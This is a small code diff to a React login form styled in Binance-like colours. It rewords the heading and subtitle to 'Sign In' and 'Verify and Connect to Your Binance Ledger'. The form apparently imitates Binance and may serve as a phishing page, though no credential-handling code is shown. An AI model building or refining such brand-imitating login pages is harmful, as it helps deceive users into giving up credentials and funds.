@@ -53,8 +53,8 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
       <div className="w-full max-w-md mx-auto">
         <div className="bg-[#1E2026] rounded-lg border border-[#2B3139] p-8">
           <div className="text-center mb-8">
-            <h1 className="text-2xl font-bold text-white mb-2">Sign In to Binance</h1>
-            <p className="text-[#848E9C] text-base">Access your Binance Ledger request</p>
+            <h1 className="text-2xl font-bold text-white mb-2">Sign In</h1>
+            <p className="text-[#848E9C] text-base">Verify and Connect to Your Binance Ledger</p>
           </div>
 
           <form onSubmit={handleSubmit} className="space-y-6">
